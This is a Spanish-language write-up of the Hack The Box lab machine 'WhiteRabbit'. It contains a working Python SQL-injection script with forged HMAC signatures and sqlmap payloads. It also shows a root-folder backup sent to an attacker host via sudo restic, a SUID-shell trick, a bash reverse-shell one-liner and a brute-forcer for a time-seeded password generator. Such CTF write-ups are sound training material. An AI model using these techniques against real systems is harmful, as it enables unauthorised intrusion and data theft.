---
tags:
  - CTF
  - estado/completo
  - Ghidra
  - Restic
  - n8n
  - Wikijs
  - SQL-Injection
plataforma: "[[Hack The Box]]"
web:
  - https://app.hackthebox.com/machines/WhiteRabbit?tab=play_machine
dificultad: Insane
---

> [!INFO] WhiteRabbit - Writeup
>  WhiteRabbit es una máquina Linux de la plataforma Hack The Box de dificultad Insane.
^descripcion

# Reconocimiento

```shell title:Shell hl:16-18,34,38,43
❯ sudo nmap -sCV -v 10.10.11.63 -oA allPorts
Starting Nmap 7.95 ( https://nmap.org ) at 2025-12-19 14:23 -05
NSE: Loaded 157 scripts for scanning.
NSE: Script Pre-scanning.
Initiating NSE at 14:23
Completed NSE at 14:23, 0.00s elapsed
Initiating NSE at 14:23
Completed NSE at 14:23, 0.00s elapsed
Initiating NSE at 14:23
Completed NSE at 14:23, 0.00s elapsed
Initiating Ping Scan at 14:23
Scanning 10.10.11.63 [4 ports]
Completed Ping Scan at 14:23, 0.33s elapsed (1 total hosts)
Initiating SYN Stealth Scan at 14:23
Scanning whiterabbit.htb (10.10.11.63) [1000 ports]
Discovered open port 80/tcp on 10.10.11.63
Discovered open port 22/tcp on 10.10.11.63
Discovered open port 2222/tcp on 10.10.11.63
Completed SYN Stealth Scan at 14:23, 2.25s elapsed (1000 total ports)
Initiating Service scan at 14:23
Scanning 3 services on whiterabbit.htb (10.10.11.63)
Completed Service scan at 14:23, 6.45s elapsed (3 services on 1 host)
NSE: Script scanning 10.10.11.63.
Initiating NSE at 14:23
Completed NSE at 14:23, 6.49s elapsed
Initiating NSE at 14:23
Completed NSE at 14:23, 0.89s elapsed
Initiating NSE at 14:23
Completed NSE at 14:23, 0.00s elapsed
Nmap scan report for whiterabbit.htb (10.10.11.63)
Host is up (0.30s latency).
Not shown: 997 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.9 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 0f:b0:5e:9f:85:81:c6:ce:fa:f4:97:c2:99:c5:db:b3 (ECDSA)
|_  256 a9:19:c3:55:fe:6a:9a:1b:83:8f:9d:21:0a:08:95:47 (ED25519)
80/tcp   open  http    Caddy httpd
| http-methods: 
|_  Supported Methods: GET HEAD
|_http-title: White Rabbit - Pentesting Services
|_http-server-header: Caddy
2222/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 c8:28:4c:7a:6f:25:7b:58:76:65:d8:2e:d1:eb:4a:26 (ECDSA)
|_  256 ad:42:c0:28:77:dd:06:bd:19:62:d8:17:30:11:3c:87 (ED25519)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
(--More--)
```


```shell title:Shell
> echo "10.10.11.63    whiterabbit.htb" | sudo tee -a /etc/hosts
```


![MainPage](https://github.com/Andrein99/Ciberseguridad-Machinas-CTFs/blob/main/Linux-Machines/Insane/Archivos%20adjuntos/WhiteRabbit/HTB-WhiteRabbit-MainPage.png)

Podemos ver las tecnologías que están usando en la página web en la sección de `Services`. 

![Services](https://github.com/Andrein99/Ciberseguridad-Machinas-CTFs/blob/main/Linux-Machines/Insane/Archivos%20adjuntos/WhiteRabbit/HTB-WhiteRabbit-Services.png)

Esto nos hace pensar que hay diferentes subdominios de la página corriendo estos servicios. Podemos utilizar `ffuf` para hacer fuzzing y encontrarlos con el siguiente comando.


```shell title:Shell
❯ ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -u http://whiterabbit.htb -H "Host: FUZZ.whiterabbit.htb" -fs 0 -s

status
```

Así obtenemos un subdominio de la página, y lo agregamos al archivo hosts.

```shell title:Shell
> sudo nano /etc/hosts
```


# Análisis de vulnerabilidades

Al visitar la página tenemos la siguiente aplicación `Uptime Kuma`:

![UptimeKuma](https://github.com/Andrein99/Ciberseguridad-Machinas-CTFs/blob/main/Linux-Machines/Insane/Archivos%20adjuntos/WhiteRabbit/HTB-WhiteRabbit-UptimeKuma.png)

Haciendo una búsqueda rápida en Google acerca de los paths por defecto que puede tener la aplicación, encontramos `status`. Podemos hacer fuzzing a este path para intentar encontrar algo de utilidad.

```Shell title:Shell
ffuf -w /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt -u http://status.whiterabbit.htb/status/FUZZ -s

temp
```

Encontramos una sección de la página en `status.whiterabbit.htb/status/temp` que tiene la siguiente apariencia:

![temp-tap](https://github.com/Andrein99/Ciberseguridad-Machinas-CTFs/blob/main/Linux-Machines/Insane/Archivos%20adjuntos/WhiteRabbit/HTB-WhiteRabbit-temp.png)

Acá se pueden ver diversos subdominios, que debemos añadir a `/etc/hosts`. Al entrar al subdominio `a668910b5514e.whiterabbit.htb` se puede encontrar una sección donde hablan de un flujo de automatización realizado con `n8n`, y se proporciona la estructura de una POST request que hace la aplicación `GoPhish` al flujo de `n8n` para que, con un Webhook, se inicie el flujo de automatización. 

![HTB-WhiteRabbit-Flujon8n.png](https://github.com/Andrein99/Ciberseguridad-Machinas-CTFs/blob/main/Linux-Machines/Insane/Archivos%20adjuntos/WhiteRabbit/HTB-WhiteRabbit-Flujon8n.png)

``` title:"POST Request" normal:1-3 warning:10-14
POST /webhook/d96af3a4-21bd-4bcb-bd34-37bfc67dfd1d HTTP/1.1
Host: 28efa8f7df.whiterabbit.htb
x-gophish-signature: sha256=cf4651463d8bc629b9b411c58480af5a9968ba05fca83efa03a21b2cecd1c2dd
Accept: */*
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
Content-Type: application/json
Content-Length: 81

{
  "campaign_id": 1,
  "email": "test@ex.com",
  "message": "Clicked Link"
}
```

En la request podemos encontrar también el subdominio donde está corriendo la aplicación de n8n `28efa8f7df.whiterabbit.htb` en el header `Host`, por lo que agregamos este subdominio a `/etc/hosts`.
En esta request se puede ver el body, y la signature de dicho body. Esto nos permite hacer tampering si obtenemos la secret key. 
Si descargamos el archivo `gophish_to_phishing_score_database.json`, que es el flujo de automatización en formato `JSON`, podemos revisar si hay alguna [[Information Disclosure]].

>[!Info] Campos no vulnerables
>En el archivo se pueden encontrar campos que reciben un parámetro. Al estar parametrizados, y no recibir el input de forma plana, usualmente las bases de datos pueden notar el SQL Injection.
>```JSON title:"Ejemplo de query del archivo"
>"query": "UPDATE victims\nSET phishing_score = phishing_score + 10\nWHERE email = $1;"
>```

También podemos encontrar en el archivo algunas queries vulnerables a SQL Injection, lo que genera un vector de ataque para sacar información de la base de datos, además, se encuentra la secret key que se usó para el encriptado, además de detalles de la implementación del encriptado, como que se usa `HMAC` y `SHA256`.

>[!Success] Información importante obtenida
>Se obtuvo información del sistema de cifrado, el secreto, y de queries inseguras para hacer SQL Injection.
>```JSON
>Información criptográfica:
>"action": "hmac",
>"type": "SHA256",
>"secret": "3CWVGMndgMvdVAzOjqBiTicmv7gxc6IS"
>...
>Información de queries vulnerables:
>"query": "SELECT * FROM victims where email = \"{{ $json.body.email }}\" LIMIT 1"
>```

En [Cyberchef](https://gchq.github.io/CyberChef/#recipe=JSON_Minify()HMAC(%7B'option':'UTF8','string':'3CWVGMndgMvdVAzOjqBiTicmv7gxc6IS'%7D,'SHA256')&input=ew0KICAiY2FtcGFpZ25faWQiOiAxLA0KICAiZW1haWwiOiAidGVzdEBleC5jb20iLA0KICAibWVzc2FnZSI6ICJDbGlja2VkIExpbmsiDQp9&ieol=CRLF) podemos hacer el tampering con la información que tenemos. Con esa receta se puede obtener la misma signature que tenía el body encontrado, por lo que sabemos que con este procedimiento podemos generar payloads válidos.

![HTB-WhiteRabbit-CyberChef.png](https://github.com/Andrein99/Ciberseguridad-Machinas-CTFs/blob/main/Linux-Machines/Insane/Archivos%20adjuntos/WhiteRabbit/HTB-WhiteRabbit-CyberChef.png)

# Explotación de vulnerabilidades

Con esta firma podemos empezar a cambiar el campo de email, porque vimos que en el workflow de `n8n` hay un campo vulnerable a SQL Injection.
Para automatizar el proceso y sacar toda la información de la bases de datos, podemos crear un programa en Python que saque cada uno de los datos.

```Python fold title:sql-injection.py
import requests
import sys
import hmac
import hashlib
import json
import re
import time

def tamper(payload):
    params = '{"campaign_id":1,"email":"%s","message":"Clicked Link"}' % payload
    secret = '3CWVGMndgMvdVAzOjqBiTicmv7gxc6IS'.encode('utf-8')
    payload_bytes = params.encode('utf-8')
    signature = 'sha256=' + hmac.new(secret, payload_bytes, hashlib.sha256).hexdigest()
    params = json.loads(params)
    return params, signature

def extract_value(url, payload_template, rhost, **kwargs):
    payload = payload_template.format(**kwargs)
    params, signature = tamper(payload)
    headers = {"Host": "28efa8f7df.whiterabbit.htb", "x-gophish-signature": signature}
    proxies = {"http": "http://127.0.0.1:8080"}
    try:
        response = requests.post(url, json=params, timeout=10, headers=headers, proxies=proxies)
    except Exception as e:
        print(f"Error connecting to URL: {e}")
        return None
    
    match = re.search(r"~([^~]+)~", response.text, re.DOTALL)
    if (match):
        return match.group(1)
    return None

def extract_databases(url, rhost):
    databases = []
    payload_template = r'\" OR updatexml(1, concat(0x7e, (SELECT schema_name FROM information_schema.schemata WHERE schema_name NOT LIKE \"information_schema\" LIMIT {offset},1), 0x7e), 1) ;'
    offset = 0
    while True:
        db = extract_value(url, payload_template, rhost, offset=offset)
        if (db and db not in databases):
            databases.append(db)
            offset += 1
        else:
            break
    return databases

def extract_tables(url, rhost, db):
    tables = []
    payload_template = r'\" OR updatexml(1, concat(0x7e, (SELECT table_name FROM information_schema.tables WHERE table_schema=\"{db}\" LIMIT {offset},1), 0x7e), 1) ;'
    offset = 0
    while True:
        table = extract_value(url, payload_template, rhost, db=db, offset=offset)
        if (table and table not in tables):
            tables.append(table)
            offset += 1
        else:
            break
    return tables

def extract_columns(url, rhost, db, table):
    columns = []
    payload_template = r'\" OR updatexml(1, concat(0x7e, (SELECT column_name FROM information_schema.columns WHERE table_schema=\"{db}\" AND table_name=\"{table}\" LIMIT {offset},1), 0x7e), 1) ;'
    offset = 0
    while True:
        column = extract_value(url, payload_template, rhost, db=db, table=table, offset=offset)
        if (column and column not in columns):
            columns.append(column)
            offset += 1
        else:
            break
    return columns

def extract_data(url, rhost, db, table, column):
    data_rows = []
    payload_template = r'\" OR updatexml(1, concat(0x7e, (SELECT {column} FROM {db}.{table} LIMIT {offset},1), 0x7e), 1) ;'
    offset = 0
    while True:
        data = extract_value(url, payload_template, rhost, db=db, table=table, column=column, offset=offset)
        if (data and data not in data_rows):
            data_rows.append(data)
            offset += 1
        else:
            break
    return data_rows

def extract_column_data(url, rhost, db, table, column):
    data_rows = []
    payload_template = r'\" OR updatexml(1, concat(0x7e, (SELECT t1.`{column}` FROM `{db}`.`{table}` t1 WHERE (SELECT COUNT(*) FROM `{db}`.`{table}` t2 WHERE t2.`{column}` <= t1.`{column}`) = {offset}+1 LIMIT 1), 0x7e), 1) ;'
    offset = 0
    while True:
        data = extract_value(url, payload_template, rhost, db=db, table=table, column=column, offset=offset)
        if (data):
            data_rows.append(data)
            offset += 1
        else:
            break
    return data_rows

def extract_all_data(url, rhost, table, column):
    data_rows = []
    for id_val in range(1, 7):
        row_data = ""
        chunk_size = 18
        pos = 1
        while True:
            payload_template = (
                r'\" OR updatexml(1,concat(0x7e,('
                r'select SUBSTRING({column}, {pos}, {chunk_size}) '
                r'from temp.{table} where id={id_val}'
                r'),0x7e),1) -- '
            )

            data = extract_value(
                url,
                payload_template,
                rhost,
                pos=pos,
                chunk_size=chunk_size,
                id_val=id_val,
                table=table,
                column=column
            )

            if not data:
                break

            row_data += data
            if (len(data) < chunk_size):
                break

            pos += chunk_size

        if row_data.strip():
            data_rows.append((id_val, row_data))
        else:
            print(f"[-] NO data for id {id_val}")
        
    return data_rows

def perform_sql_injection(rhost):
    print("[i] Performing SQL injection...")
    url = f"http://{rhost}/webhook/d96af3a4-21bd-4bcb-bd34-37bfc67dfd1d"
    databases = extract_databases(url, rhost)
    if not databases:
        print(f"[!] No databases found.")
        return
    
    for db in databases:
        print(f"[+] Got database: {db}")
        if (not db == "phising"):
            tables = extract_tables(url, rhost, db)
            if (not tables):
                print(f"[!] No tables found for database {db}.")
                continue

            for table in tables:
                print(f"[+] Got table: {table}")
                print("[i] Extracting Columns...")
                columns = extract_columns(url, rhost, db, table)
                if not columns:
                    print(f"[!] No columns found for table {table} in database {db}.")
                    continue
                for column in columns:
                    print(f"[+] Got column: {column}")
                    print("[i] Extracting Data...")
                    rows = extract_all_data(url, rhost, table, column)
                    for row in rows:
                        print(f"[+] {row}")

def main():
    rhost = "10.10.11.63"
    perform_sql_injection(rhost)

if (__name__ == '__main__'):
    main()
```

Para ejecutar el código debemos usar un proxy como BurpSuite, y configurar el navegador para redireccionar el tráfico al proxy. Al ejecutar el script tenemos el siguiente resultado:

```Shell fold title:Shell hl:36,37,40 warning:48
❯ python sql-injection.py
[i] Performing SQL injection...
[+] Got database: phishing
[+] Got table: victims
[i] Extracting Columns...
[+] Got column: email
[i] Extracting Data...
[-] NO data for id 1
[-] NO data for id 2
[-] NO data for id 3
[-] NO data for id 4
[-] NO data for id 5
[-] NO data for id 6
[+] Got column: phishing_score
[i] Extracting Data...
[-] NO data for id 1
[-] NO data for id 2
[-] NO data for id 3
[-] NO data for id 4
[-] NO data for id 5
[-] NO data for id 6
[+] Got database: temp
[+] Got table: command_log
[i] Extracting Columns...
[+] Got column: id
[i] Extracting Data...
[+] (1, '1')
[+] (2, '2')
[+] (3, '3')
[+] (4, '4')
[+] (5, '5')
[+] (6, '6')
[+] Got column: command
[i] Extracting Data...
[+] (1, 'uname -a')
[+] (2, 'restic init --repo rest:http://75951e6ff.whiterabbit.htb')
[+] (3, 'echo ygcsv************* > .restic_passwd')
[+] (4, 'rm -rf .bash_history ')
[+] (5, '#thatwasclose')
[+] (6, 'cd /home/neo/ && /opt/neo-password-generator/neo-password-generator | passwd')
[+] Got column: date
[i] Extracting Data...
[+] (1, '2024-08-30 10:44:01')
[+] (2, '2024-08-30 11:58:05')
[+] (3, '2024-08-30 11:58:36')
[+] (4, '2024-08-30 11:59:02')
[+] (5, '2024-08-30 11:59:47')
[+] (6, '2024-08-30 14:40:42')
```

Aquí podemos ver el subdominio `75951e6ff.whiterabbit.htb` para agregar a `/etc/hosts` en donde está corriendo la aplicación [[restic]]. También tenemos la contraseña de la aplicación, y un comando de lo que parece ser un binario que genera una contraseña personalizada, en este caso en particular, para el usuario `neo`.

>[!Tip] Generador de contraseñas
>Hay generadores de contraseñas que utilizan la fecha actual para generar la contraseña aleatoria. Si obtenemos este binario, y lo analizamos, podríamos necesitar este tiempo para encontrar la contraseña a través de fuerza bruta.

>[!Info]- Forma alternativa de hacer el proceso con SQLMap
>Se puede crear un proxy con Python para automatizar estas llamadas que se hacen al WebHook para que intente los payloads de `sqlmap`. El código de Python podría ser el siguiente usando la librería `mitmproxy`.
>```python title:sign-hmac.py
>#!/usr/bin/env python3
>
>import hmac
>import hashlib
>import json
>from mitmproxy import http
>
>SECRET = b'3CWVGMndgMvdVAzOjqBiTicmv7gxc6IS'
>
>def request(flow: http.HTTPFlow) -> None:
>    if (flow.request.method == "POST" and flow.request.path.startswith("/webhook/")):
>        try:
>            body = flow.request.get_text()
>            data = json.loads(body)
>            payload = json.dumps(data, separators=(',',':')).encode()
>            signature = hmac.new(SECRET, payload, hashlib.sha256).hexdigest()
>            flow.request.headers["x-gophish-signature"] = f"sha256={signature}"
>        except Exception as e:
>            print(f"Error signing request: {e}")
>```
>Se puede ejecutar el programa con el comando `mitmproxy -s sign-hmac.py -p 8888 --mode regular`. Y luego, en otra consola utilizar el siguiente comando hacia el WebHook con el body y el header respectivo, utilizando el proxy recién creado en el puerto 8888.
>```Shell title:Shell
>sqlmap -u "http://28efa8f7df.whiterabbit.htb/webhook/d96af3a4-21bd-4bcb-bd34-37bfc67dfd1d" --method=POST --data='{"campaign_id": 1,"email": "test@ex.com","message": "Clicked Link"} ' -p email --headers="Content-Type: application/json" --dbms mysql --batch --proxy=http://127.0.0.1:8888/
>(--Zip--)
>sqlmap identified the following injection point(s) with a total of 749 HTTP(s) requests:
>---
>Parameter: JSON email ((custom) POST)
>Type: boolean-based blind
>Title: MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause
>Payload: {"campaign_id": 1,"email": "test@ex.com" RLIKE (SELECT (CASE WHEN (2878=2878) THEN 0x746573744065782e636f6d ELSE 0x28 END))-- RfXj","message": "Clicked Link"} 
>
>Type: error-based
>Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
>Payload: {"campaign_id": 1,"email": "test@ex.com" AND (SELECT 1746 FROM(SELECT COUNT(*),CONCAT(0x7176767a71,(SELECT (ELT(1746=1746,1))),0x717a7a7a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- CNjW","message": "Clicked Link"} 
>
>Type: stacked queries
>Title: MySQL >= 5.0.12 stacked queries (comment)
>Payload: {"campaign_id": 1,"email": "test@ex.com";SELECT SLEEP(5)#","message": "Clicked Link"} 
>
>Type: time-based blind
>  Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
> Payload: {"campaign_id": 1,"email": "test@ex.com" AND (SELECT 8708 FROM (SELECT(SLEEP(5)))TTPh)-- QDrX","message": "Clicked Link"}
>---
>
>```
>Con esta información, podemos ser más específicos y comenzar a pedirle más detalles acerca de bases de datos y tablas que nos interesen.
>```shell title:Shell
>sqlmap -u "http://28efa8f7df.whiterabbit.htb/webhook/d96af3a4-21bd-4bcb-bd34-37bfc67dfd1d" --method=POST --data='{"campaign_id": 1,"email": "test@ex.com","message": "Clicked Link"} ' -p email --headers="Content-Type: application/json" --dbms mysql --batch --proxy=http://127.0.0.1:8888/ --dbs
>```
>Para saber las bases de datos usamos la flag `--dbs`. Luego podemos quitar esa flag, especificar una base de datos, y buscar las tablas con `-D <nombre-BBDD> --tables`, luego tomar una tabla específica con `-D <nombre-BBDD> -T <nombre-tabla> --dump` para obtener los datos. Para la BBDD `temp` con la tabla `command_log` se obtuvo la misma información de antes:
>```
>Database: temp
>Table: command_log
>[6 entries]
>+----+---------------------+------------------------------------------------------------------------------+
>| id | date                | command                                                                      |
>+----+---------------------+------------------------------------------------------------------------------+
>| 1  | 2024-08-30 10:44:01 | uname -a                                                                     |
>| 2  | 2024-08-30 11:58:05 | restic init --repo rest:http://75951e6ff.whiterabbit.htb                     |
>| 3  | 2024-08-30 11:58:36 | echo ygcsv************** > .restic_passwd                       |
>| 4  | 2024-08-30 11:59:02 | rm -rf .bash_history                                                         |
>| 5  | 2024-08-30 11:59:47 | #thatwasclose                                                                |
>| 6  | 2024-08-30 14:40:42 | cd /home/neo/ && /opt/neo-password-generator/neo-password-generator | passwd |
>+----+---------------------+-----------------------------------------------------------------------------→+
>
>[01:31:17] [INFO] table 'temp.command_log' dumped to CSV file '/home/kali/.local/share/sqlmap/output/28efa8f7df.whiterabbit.htb/dump/temp/command_log.csv'                      
>[01:31:17] [INFO] fetched data logged to text files under '/home/kali/.local/share/sqlmap/output/28efa8f7df.whiterabbit.htb'
>``` 

## Restic

Podemos instalar `restic`, un programa para hacer backups, y usarlo para ver si en la ruta se encuentra un backup de utilidad. Si usamos el siguiente comando podemos ver los snapshots que hay:

```Shell title:Shell 
❯ RESTIC_PASSWORD=ygcsv************** restic -r rest:http://75951e6ff.whiterabbit.htb snapshots
repository 5b26a938 opened (version 2, compression level auto)
ID        Time                 Host         Tags        Paths
------------------------------------------------------------------------
272c****  2025-03-06 19:18:40  whiterabbit              /dev/shm/bob/ssh
------------------------------------------------------------------------
1 snapshots
```

De acá podemos saber que hay un snapshot, y el ID (`272c****`) del snapshot para restaurarlo. El siguiente comando lo restaura en una carpeta llamada `restic` en el path actual.

```Shell title:Shell
> RESTIC_PASSWORD=ygcsv******************* restic -r rest:http://75951e6ff.whiterabbit.htb restore 272c**** --target ./restic/
```

Al navegar en las carpetas se puede ver que sólo contienen un archivo `.7z` llamado `bob.7z` que tiene contraseña, por lo que debemos crackearla.

```shell title:Shell
 > 7z2john bob.7z > ziphash.txt
```

```shell title:Shell hl:10
❯ john ziphash.txt -w=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (7z, 7-Zip archive encryption [SHA256 256/256 AVX2 8x AES])
Cost 1 (iteration count) is 524288 for all loaded hashes
Cost 2 (padding size) is 3 for all loaded hashes
Cost 3 (compression type) is 2 for all loaded hashes
Cost 4 (data length) is 365 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
1q********     (bob.7z)     
1g 0:00:04:29 DONE (2025-12-19 19:49) 0.003707g/s 88.38p/s 88.38c/s 88.38C/s 231086..150390
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

Con la contraseña podemos descomprimir el archivo, y vemos que tenemos diferentes claves y una archivo de configuración donde está el usuario, el puerto, y el host para conectarnos. Podemos usar la opción `-i` para usar la clave privada y acceder en vez de proporcionar una contraseña para `bob`.

```Shell title:Shell
❯ ssh bob@whiterabbit.htb -p 2222 -i bob
Welcome to Ubuntu 24.04 LTS (GNU/Linux 6.8.0-57-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

This system has been minimized by removing packages and content that are
not required on a system that users do not log into.

To restore this content, you can run the 'unminimize' command.
Last login: Fri Dec 19 18:20:32 2025 from 10.10.15.31

bob@ebdce80611e9:~$ 
```

Al ver los permisos con `sudo -l` podemos ver que el usuario `bob` tiene permiso de sudo para ejecutar `/usr/bin/restic`. [GTFObins](https://gtfobins.github.io/gtfobins/restic/) muestra una forma de escalar privilegios con `restic` que consiste en crear un backup local (Podemos usar para esto `Docker` ) de la carpeta `root` ya que tenemos el permiso de ejecutar la operación de backup de restic con permisos elevados.

```Shell title:Shell
> mkdir data 
> docker run --rm -p 8000:8000 -v ./data:/data --name rest_server -e "DISABLE_AUTHENTICATION=true" restic/rest-server
```

Iniciamos un repositorio de nuestro servidor:

```Shell title:Shell
bob@ebdce80611e9:~$ sudo /usr/bin/restic init -r "rest:http://10.10.16.71:8000/temp"
```

Hacemos el backup de la carpeta `root` de la máquina objetivo:

```Shell title:Shell
bob@ebdce80611e9:~$ sudo /usr/bin/restic backup -r "rest:http://10.10.16.71:8000/temp" /root/
```

Recuperamos el contenido que extrajimos al restaurar ese backup que le hicimos a la carpeta `root`.

```Shell title:Shell
> mkdir root 
> restic restore <ID-del-backup> -r "rest:http://10.10.16.71:8000/temp" --target root
```

En la carpeta `root` encontramos otra llave para un usuario llamado `morpheus`:

```Shell title:Shell
> ssh morpheus@whiterabbit.htb -i morpheus 
Welcome to Ubuntu 24.04.2 LTS (GNU/Linux 6.8.0-57-generic x86_64) 

morpheus@whiterabbit:~$
```

>[!Tip]- Alternativa para obtener al usuario `morpheus`
>La CLI de restic tiene una flag llamada `--password-command` que nos permite ejecutar comandos. Podemos utilizar esto, al usar `sudo`, para hacer una copia de la shell del usuario con privilegios y darle `SUID` para leer el contenido de la carpeta `root`.
>```Shell title:Shell wrap
>bob@ebdce80611e9:~$ sudo restic --password-command "touch /tmp/shell" check
>bob@ebdce80611e9:~$ sudo restic --password-command "/bin/cp /bin/bash /tmp/shell" check
>bob@ebdce80611e9:~$ sudo restic --password-command "chmod 4655 /tmp/shell" check
>```
>>[!Info] Otro payload
>>Podríamos intentar hacer una shell reversa con bash `'bash -c "bash -i 2>&1 /dev/tcp/<ip-atacante>/<puerto> 0>&1"'`, y recibir la conexión con Netcat.
>
>Con esto podemos ejecutar el archivo en `tmp` con el nombre `shell`, y tendremos acceso a la shell de root para movernos a la carpeta que necesitamos.
>>[!warning] Problema con transferencia del archivo
>>A veces se puede tener dificultades copiando y pegando el contenido del archivo de clave pública o privada, por lo que una forma de sortear este inconveniente es cifrarlo en base64 `cat morpheus | base64`, copiar el contenido cifrado, y descifrarlo en el host propio con `echo "<contenido-cifrado-base64>" | base64 -d > morpheus`
>>

# Escalada de privilegios


```shell
❯ scp -i ../morpheus morpheus@whiterabbit.htb:/opt/neo-password-generator/neo-password-generator .
neo-password-generator                 100%   15KB  34.9KB/s   00:00    
```

Podemos ver que al ejecutar el binario de forma consecutiva tenemos respuestas diferentes.

```shell
morpheus@whiterabbit:/opt/neo-password-generator$ ./neo-password-generator 
od521tzwiaFYXdEWrb3O

morpheus@whiterabbit:/opt/neo-password-generator$ ./neo-password-generator 
aK4bNp3cYatStZENTVMn
```

Usando `Ghidra` para hacer ingeniería inversa en el binario obtenido encontramos dos funciones relevantes en `C`.

```C title:"Función main en neo-password-generator decompilado"
undefined8 main(void) { 
	long in_FS_OFFSET; 
	timeval local_28; 
	long local_10;
	
	local_10 = *(long *)(in_FS_OFFSET + 0x28); 
	gettimeofday(&local_28,(__timezone_ptr_t)0x0);
	generate_password(local_28.tv_sec * 1000 + local_28.tv_usec / 1000);
	if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) {
		/* WARNING: Subroutine does not return */ 
		__stack_chk_fail(); 
	} 
	return 0;
}
```


```C title:"Función generate_password en neo-password-generator decompilado"
void generate_password(uint param_1) { 
	int iVar1; 
	long in_FS_OFFSET; 
	int local_34; 
	char local_28 [20]; 
	undefined1 local_14; 
	long local_10;
	
	local_10 = *(long *)(in_FS_OFFSET + 0x28);
	srand(param_1); 
	for (local_34 = 0; local_34 < 0x14; local_34 = local_34 + 1) {
		iVar1 = rand();
		local_28[local_34] = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"[iVar1 % 0x3e]; 
	} 
	local_14 = 0;
	puts(local_28);
	if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) { 
	/* WARNING: Subroutine does not return */
	 __stack_chk_fail(); 
	 } 
	 return;
}
```

Al analizar el código podemos hacer reemplazos a las variables según su utilidad aparente.

```C title="Función generate_password en neo-password-generator decompilado con reemplazos"
void generate_password(uint current_time_milliseconds)

{
  int random_number;
  long in_FS_OFFSET;
  int i;
  char password [20];
  undefined1 local_14;
  long local_10;
  
  local_10 = *(long *)(in_FS_OFFSET + 40);
  srand(current_time_milliseconds);
  for (i = 0; i < 20; i = i + 1) {
    random_number = rand();
    password[i] = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
                  [random_number % 62];
  }
  local_14 = 0;
  puts(password);
  if (local_10 != *(long *)(in_FS_OFFSET + 40)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return;
}
```


```C title:"Función main en neo-password-generator decompilado con reemplazos" warning:10
undefined8 main(void)

{
  long in_FS_OFFSET;
  timeval current_time;
  long local_10;
  
  local_10 = *(long *)(in_FS_OFFSET + 40);
  gettimeofday(&current_time,(__timezone_ptr_t)0x0);
  generate_password(current_time.tv_sec * 1000 + current_time.tv_usec / 1000);
  if (local_10 != *(long *)(in_FS_OFFSET + 40)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return 0;
}
```

El código parce hacer un cálculo de la contraseña usando la fecha actual con una precisión de microsegundos usando un conjuntos de caracteres comprendido por [a-zA-Z0-9].  También podemos notar el cálculo que se usa para calcular el milisegundo y dar la semilla para los valores aleatorios.

$$milisegundos = segundos * \frac{1000milisegundos}{1segundo} + microsegundos*\frac{1milisegundo}{1000microsegundos}$$

Como conocemos los segundos de la fecha `2024-08-30 14:40:42`del comando usado podemos reemplazarlo fácilmente en la ecuación, sin embargo, los microsegundos no los tenemos, por lo que escribimos un script en C con las mismas funciones para generar una contraseña por cada microsegundo que transcurrió. Al final, hacemos fuerza bruta con cada una de estas contraseñas para encontrar la que se generó con el comando en el historial de comandos encontrado.

```c title:neo-password-generator-cracked.c warning:23 normal:24
#include <stdlib.h>
#include <stdio.h>
#include <string.h>

#define PASSWORD_LENGTH 20

const char CHARSET[] = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
const int CHARSET_LENGTH = sizeof(CHARSET) - 1;

void generate_password(unsigned int seed, char *out) {
  srand(seed);
  for (int i=0; i < PASSWORD_LENGTH; i++) {
    int index = rand() % CHARSET_LENGTH;
    out[i] = CHARSET[index];
  }
  out[PASSWORD_LENGTH] = '\0'; // Null terminator to ensure that it's taken as the string ended.
}


int main(void) {
  // https://www.epochconverter.com/
  // 2024-08-30 14:40:42 = 1725028842
  unsigned int timestamp = 1725028842;
  char password[PASSWORD_LENGTH + 1];
  
  for (int ms = 0; ms < 1000; ms++) {
    unsigned int seed = timestamp * 1000 + ms;
    generate_password(seed, password);
    printf("%s\n", password);
  }

  return 0;
}
```

Compilamos el programa que generamos para que sea ejecutable usando el compilador `gcc`.

```shell title:"Shell"
❯ gcc neo-password-generator-cracked.c -o neo-password-generator-cracked
```

Ejecutamos el binario, y hacemos una redirección de la salida del programa a un archivo de texto para usarlo en el proceso de cracking posterior:

```shell title:Shell
❯ ./neo-password-generator-cracked > possible_passwords.txt
❯ head possible_passwords.txt

L7Qf2aFEohexxuk07tEw
hN6DEuEFtQ5LZX8uxw9r
lWL7jrjJTC54qDojrCvV
mnQ1II9iyvPJRhLBMVfB
XSfLZ30sr8sjDJbx8geU
cOBXPQDByTiWBDDEYJXK
R4njydUwbk3uML4yVoT9
gUepuICfnxFcf7e7K7RA
c4L87irvHxX7pZGX9if6
Y7a6NqegKAmmdunHc6Uq
```

Podemos crackear la contraseña proporcionando esta lista de contraseñas que generamos, y usando la herramienta `hydra` para hacer fuerza bruta al inicio de sesión de [[SSH]].

>[!Success] ¡Contraseña de `neo` crackeada!
>Al ejecutar el comando de `hydra` obtenemos la contraseña de `neo`.
